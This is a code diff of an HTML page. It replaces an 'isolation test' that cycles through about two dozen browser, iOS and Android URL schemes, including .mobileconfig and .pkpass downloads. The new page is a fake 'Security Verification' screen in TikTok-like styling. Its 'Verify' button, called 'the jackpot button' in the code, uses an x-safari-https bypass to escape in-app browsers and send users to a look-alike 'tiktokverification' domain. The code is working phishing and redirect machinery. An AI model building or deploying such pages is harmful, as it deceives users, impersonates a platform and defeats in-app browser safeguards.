@@ -2,81 +2,51 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Isolation Test: 1-23</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verification Check</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: sans-serif; text-align: center; padding: 50px; }
-        #btn { border: 5px solid #00ff00; padding: 40px; cursor: pointer; font-size: 24px; font-weight: bold; }
-        #counter { font-size: 72px; margin-top: 20px; color: #fff; }
-        .log { color: #888; font-size: 14px; margin-top: 20px; }
+        body { 
+            margin: 0; padding: 0; background: #ffffff; 
+            font-family: -apple-system, sans-serif;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; text-align: center;
+        }
+
+        .container { padding: 20px; max-width: 400px; }
+        
+        .header { color: #161823; font-size: 24px; font-weight: 700; margin-bottom: 10px; }
+        .subtext { color: #8A8B91; font-size: 16px; margin-bottom: 40px; }
+        
+        /* The jackpot button */
+        .btn {
+            background-color: #FE2C55; color: #ffffff; border-radius: 4px;
+            font-size: 18px; font-weight: 600; padding: 15px 60px;
+            text-decoration: none; display: inline-block; cursor: pointer;
+            border: none; width: 100%; box-sizing: border-box;
+        }
     </style>
 </head>
 <body>
 
-    <div id="btn">TAP TO START ISOLATION TEST</div>
-    <div id="counter">0</div>
-    <div id="log" class="log">Awaiting test...</div>
+    <div class="container">
+        <div class="header">Security Verification</div>
+        <p class="subtext">Please tap the button below to continue to the verification page.</p>
+        
+        <button class="btn" onclick="triggerJackpot()">Verify</button>
+    </div>
 
     <script>
-        const target = "tiktokverification.github.io/captcha/Verification/verify1.html";
-        const httpsTarget = "https://" + target;
+        const destination = "tiktokverification.github.io/captcha/Verification/verify1.html";
 
-        function startTest() {
-            const display = document.getElementById('counter');
-            const log = document.getElementById('log');
-            let current = 0;
+        function triggerJackpot() {
+            // Method #1: The x-safari-https bypass
+            window.location.href = "x-safari-https://" + destination;
 
-            const methods = [
-                // 1-10: Browser Schemes
-                () => { location.href = "x-safari-https://" + target; },
-                () => { location.href = "googlechromes://" + target; },
-                () => { location.href = "microsoft-edge-https://" + target; },
-                () => { location.href = "firefox-apple-ios://open-url?url=" + httpsTarget; },
-                () => { location.href = "opera-https://" + target; },
-                () => { location.href = "brave-https://" + target; },
-                () => { location.href = "ucbrowser-https://" + target; },
-                () => { location.href = "yandexbrowser-https://" + target; },
-                () => { location.href = "dolphin-https://" + target; },
-                () => { location.href = "puffin-https://" + target; },
-
-                // 11-20: iOS System Services
-                () => { location.href = "applenews://" + target; },
-                () => { location.href = "com.apple.stocks://"; },
-                () => { location.href = httpsTarget + "/v.pkpass"; },
-                () => { location.href = httpsTarget + "/s.mobileconfig"; },
-                () => { location.href = "share.icloud.com/verify"; },
-                () => { location.href = "music://"; },
-                () => { location.href = "gamecenter://"; },
-                () => { location.href = "podcasts://"; },
-                () => { location.href = "x-apple-reminder://"; },
-                () => { location.href = "shortcuts://run-shortcut?name=Verify"; },
-
-                // 21-23: Android/Chrome Intents
-                () => { location.href = "intent://" + target + "#Intent;scheme=https;package=com.android.chrome;end"; },
-                () => { location.href = "intent://" + target + "#Intent;scheme=https;package=com.sec.android.app.sbrowser;end"; },
-                () => { location.href = "googlechrome://navigate?url=" + httpsTarget; }
-            ];
-
-            const interval = setInterval(() => {
-                if (current >= methods.length) {
-                    clearInterval(interval);
-                    log.innerText = "Test Finished. No breakout detected.";
-                    return;
-                }
-
-                current++;
-                display.innerText = current;
-                log.innerText = "Firing Method " + current + "...";
-
-                try {
-                    methods[current - 1]();
-                } catch (e) {
-                    log.innerText = "Error on " + current;
-                }
-            }, 1000); // 1 second gap so you can clearly see the number before it jumps
+            // Fallback: Opens in the current browser if protocol fails
+            setTimeout(() => {
+                window.location.assign("https://" + destination);
+            }, 750);
         }
-
-        document.getElementById('btn').addEventListener('click', startTest);
     </script>
 </body>
 </html>
